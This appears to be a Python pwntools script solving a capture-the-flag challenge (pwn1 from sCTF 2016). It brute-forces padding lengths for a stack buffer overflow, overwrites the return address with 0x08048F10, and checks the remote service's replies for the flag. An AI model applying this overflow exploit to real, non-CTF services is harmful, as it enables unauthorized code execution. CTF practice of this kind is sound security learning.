from pwn import *
from pprint import pprint
#p=process('./pwn1')
d=''
for i in range(28):
#p.recv()
	if i<20 :
		continue
	p1='I'*i
	for j in range(28-len(p1)):
		try:
			p=remote('problems2.2016q1.sctf.io','1337')
		except:
			print str(i)+' '+str(j)+'Fail'
			continue
		p2='a'*j
		payload=p1+p2+p32(0x08048F10)
		pprint(payload)
		p.sendline(payload)
		try:
			d=p.recv()
		except:
			continue
		p.interactive()
		pprint(d)
		if 'sctf' in d:
			print '========================='
			pprint(payload)
			print '========================='
			break
		p.close()
	if 'sctf' in d:
		break
print d

